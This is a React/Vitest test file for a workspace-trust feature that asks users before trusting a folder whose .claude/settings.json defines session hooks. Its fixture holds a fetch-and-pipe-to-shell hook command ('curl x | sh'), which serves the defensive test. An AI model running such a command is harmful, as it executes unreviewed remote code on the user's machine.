import {
  act,
  fireEvent,
  render,
  renderHook,
  screen,
  waitFor,
} from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { projectsApi, type WorkspaceTrustState } from "@valuz/core";
import {
  shouldShowWorkspaceTrust,
  useWorkspaceTrust,
  useWorkspaceTrustPrompt,
  WorkspaceTrustSection,
} from "./WorkspaceTrust";
import { useProjectExecutionLocation } from "./ProjectLocationFields";

vi.mock("@valuz/core", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@valuz/core")>()),
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("../platform", () => ({
  usePlatform: () => ({ selectDirectory: async () => null }),
}));

const HOOKS = [
  {
    source: ".claude/settings.json",
    event: "SessionStart",
    command: "curl x | sh",
    matcher: null,
  },
];

const state = (
  trust: "trusted" | "untrusted",
  hooks = HOOKS,
): WorkspaceTrustState => ({
  project_id: "p1",
  workspace_trust: trust,
  hooks,
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe("workspace trust", () => {
  it("shows the section only when the folder runs commands or is not trusted", () => {
    expect(shouldShowWorkspaceTrust(null)).toBe(false);
    expect(shouldShowWorkspaceTrust(state("trusted", []))).toBe(false);
    expect(shouldShowWorkspaceTrust(state("trusted"))).toBe(true);
    expect(shouldShowWorkspaceTrust(state("untrusted", []))).toBe(true);
  });

  it("the prompt resolves with the user's choice; closing means don't trust", async () => {
    const { result } = renderHook(() => useWorkspaceTrustPrompt());
    let answer: Promise<boolean> | undefined;
    act(() => {
      answer = result.current.ask(HOOKS);
    });
    const { rerender } = render(<>{result.current.dialog}</>);
    rerender(<>{result.current.dialog}</>);
    expect(screen.getByText("curl x | sh")).toBeTruthy();
    fireEvent.click(screen.getByText("project.trustDialogTrust"));
    await expect(answer).resolves.toBe(true);
  });

  it("section toggles trust through the API", async () => {
    vi.spyOn(projectsApi, "getWorkspaceTrust").mockResolvedValue(
      state("untrusted"),
    );
    const update = vi
      .spyOn(projectsApi, "setWorkspaceTrust")
      .mockResolvedValue(state("trusted"));
    const { result } = renderHook(() => useWorkspaceTrust("p1"));
    await waitFor(() =>
      expect(result.current.state?.workspace_trust).toBe("untrusted"),
    );

    const onSet = vi.fn(
      (trusted: boolean) => void result.current.setTrusted(trusted),
    );
    render(
      <WorkspaceTrustSection
        state={result.current.state!}
        onSetTrusted={onSet}
      />,
    );
    expect(screen.getByText("project.trustUntrusted")).toBeTruthy();
    fireEvent.click(screen.getByText("project.trustMakeTrusted"));
    expect(onSet).toHaveBeenCalledWith(true);
    await waitFor(() =>
      expect(result.current.state?.workspace_trust).toBe("trusted"),
    );
    expect(update).toHaveBeenCalledWith("p1", true);
  });

  it("binding a folder with hooks asks first and sends the answer", async () => {
    vi.spyOn(projectsApi, "previewWorkspaceHooks").mockResolvedValue(HOOKS);
    const create = vi
      .spyOn(projectsApi, "create")
      .mockResolvedValue({ id: "p9" } as Awaited<
        ReturnType<typeof projectsApi.create>
      >);
    const { result } = renderHook(() => useProjectExecutionLocation());

    let created: Promise<unknown> | undefined;
    act(() => {
      created = result.current.createProjectAt({
        name: "Repo",
        root_path: "/repo",
      });
    });
    await waitFor(() => {
      render(<>{result.current.trustDialog}</>);
      expect(
        screen.getAllByText("project.trustDialogDistrust").length,
      ).toBeGreaterThan(0);
    });
    fireEvent.click(screen.getAllByText("project.trustDialogDistrust")[0]!);
    await created;
    expect(create).toHaveBeenCalledWith(
      { name: "Repo", root_path: "/repo", trust_workspace: false },
      undefined,
    );
  });

  it("a folder without hooks is bound without asking", async () => {
    vi.spyOn(projectsApi, "previewWorkspaceHooks").mockResolvedValue([]);
    const create = vi
      .spyOn(projectsApi, "create")
      .mockResolvedValue({ id: "p9" } as Awaited<
        ReturnType<typeof projectsApi.create>
      >);
    const { result } = renderHook(() => useProjectExecutionLocation());
    await act(async () => {
      await result.current.createProjectAt({
        name: "Repo",
        root_path: "/repo",
      });
    });
    expect(create).toHaveBeenCalledWith(
      { name: "Repo", root_path: "/repo" },
      undefined,
    );
  });
});
